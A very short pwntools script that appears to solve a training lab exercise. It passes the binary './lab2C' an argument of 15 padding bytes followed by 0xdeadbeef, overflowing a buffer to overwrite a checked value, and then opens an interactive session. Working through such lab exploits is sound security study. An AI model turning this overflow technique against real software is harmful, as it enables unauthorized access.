from pwn import *
pwnlib.args.SILENT('SILENT')

p = process(['./lab2C', "A" * 15 + "\xef\xbe\xad\xde"])
p.interactive()
